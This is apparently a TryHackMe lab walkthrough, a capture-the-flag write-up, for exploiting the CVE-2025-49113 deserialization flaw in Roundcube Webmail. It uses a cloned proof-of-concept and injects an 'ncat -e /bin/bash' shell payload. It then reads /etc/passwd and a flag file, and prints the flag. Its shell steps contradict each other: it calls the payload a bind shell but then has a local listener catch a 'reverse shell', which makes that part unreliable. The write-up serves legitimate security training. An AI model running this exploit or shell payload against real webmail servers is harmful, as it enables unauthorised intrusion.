---
title: "TryHackMe - CVE-2025-49113 Webmail Deserialization Walkthrough"
date: 2025-06-28
categories: [TryHackMe]
tags: [CTF, Deserialization, Webmail, PHP, Reverse Shell, CVE-2025-49113]
image: ./assets/images/thm-cover/cve-2025-49113-cover.jpg
---

# TryHackMe - CVE-2025-49113 Webmail Deserialization Walkthrough

---

## Step 1: Gaining Access to Roundcube Webmail
Start by navigating to the Roundcube Webmail login page and use the provided credentials to log in.

**Credentials**:
- **Username**: `ellieptic`
- **Password**: `ChangeMe123`

---

## Step 2: Downloading the PoC Exploit
Download the proof of concept (PoC) exploit from the GitHub repository.

```bash
sleep33@THM:~$ git clone https://github.com/fearsoff-org/CVE-2025-49113
```

Once downloaded, navigate to the folder containing the exploit files.

```bash
sleep33@THM:~$ cd CVE-2025-49113/
root@attackbox:~/CVE-2025-49113# ls
CVE-2025-49113.php  rc_install.sh  README.md
```

---

## Step 3: Running the Exploit
The PoC exploit involves creating a malicious serialized PHP object and injecting it via the `_from` parameter in the `upload.php` endpoint.

Run the PoC script to execute the payload, using the following arguments:

```bash
root@attackbox:~/CVE-2025-49113# php CVE-2025-49113.php http://<TARGET_IP>/roundcube ellieptic ChangeMe123 "ncat -lvnp 4444 -e /bin/bash"
```

### Result:
- The script successfully authenticates the user.
- The malicious payload is injected into the `_from` parameter.
- The server executes the payload, establishing a bind shell on port 4444.

---

## Step 4: Establishing Reverse Shell
Once the payload is successfully executed, open a listener on port 4444 to catch the reverse shell.

```bash
sleep33@THM:~$ nc -lvnp 4444
```

### Result:
After a short delay, the shell connects back to your listener, giving you access to the server as the `www-data` user.

---

## Step 5: Searching for User Information
Search the system to identify users and gather information. Use the following command to find user details:

```bash
sleep33@THM:~$ grep "maggie" /etc/passwd
```

### Result:
- **User Found**: `maggiebyte`
- **Full Name**: `Maggie Byte`

This gave us a clue about the user we needed to find.

---

## Step 6: Searching for the Flag
Explore the `/etc` directory for a potential flag file. After listing the contents of `/etc`, you find the `flag.txt` file.

```bash
sleep33@THM:~$ cat /etc/flag.txt
```

### Flag Found:
**Flag**:
```
THM{ICE_CUBE_DESERIALISATION}
```

This is the first flag, and it corresponds to the **deserialization** vulnerability and the successful exploitation of it.

---

## Summary
In this walkthrough, we exploited a **deserialization vulnerability** in Roundcube Webmail, using a **PoC exploit** to inject a malicious payload that gave us a reverse shell. We escalated our knowledge by identifying the username and name of the user `Maggie Byte`, and eventually located the flag in the `/etc` directory.

### Flags Summary:
- **Flag 1**: `THM{ICE_CUBE_DESERIALISATION}`

---

This concludes the walkthrough for the **CVE-2025-49113** vulnerability in Roundcube Webmail. By exploiting deserialization, we gained access to the server and successfully retrieved the flag.
